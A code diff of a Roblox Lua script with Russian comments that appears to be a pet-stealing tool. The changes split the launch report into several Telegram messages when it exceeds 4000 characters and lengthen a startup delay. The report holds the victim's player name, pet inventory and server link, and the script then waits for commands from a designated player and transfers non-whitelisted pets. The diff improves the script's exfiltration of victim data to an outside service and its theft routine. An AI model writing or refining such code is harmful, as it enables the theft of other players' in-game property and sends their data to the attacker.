@@ -304,16 +304,36 @@ local function getPetsList()
     return table.concat(result, "\n")
 end
 local function sendInitialNotification()
+    local petsList = getPetsList()
+    local serverLink = getServerLink()
+    
     local message = string.format(
         "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s\n\n%s\n\nСсылка: %s",
         LocalPlayer.Name,
         TARGET_PLAYER, 
         TRIGGER_MESSAGE,
-        getPetsList(),
-        getServerLink()
+        petsList,
+        serverLink
     )
     
-    sendToTelegram(message)
+    -- Проверяем длину сообщения
+    if #message > 4000 then
+        -- Отправляем по частям
+        local part1 = string.format(
+            "СКРИПТ ЗАПУЩЕН\n\nИгрок: %s\nКоманды от: %s\nТриггер: %s",
+            LocalPlayer.Name,
+            TARGET_PLAYER, 
+            TRIGGER_MESSAGE
+        )
+        
+        sendToTelegram(part1)
+        task.wait(1)
+        sendToTelegram(petsList)
+        task.wait(1)
+        sendToTelegram("Ссылка: " .. serverLink)
+    else
+        sendToTelegram(message)
+    end
 end
 local function transferPet(pet)
     if not pet.isWhitelisted then 
@@ -444,6 +464,6 @@ pcall(function()
     )
     game:HttpGet(testUrl2)
 end)
-task.wait(1)
+task.wait(3) -- Больше времени для загрузки питомцев
 sendInitialNotification()
 setupMessageListener()
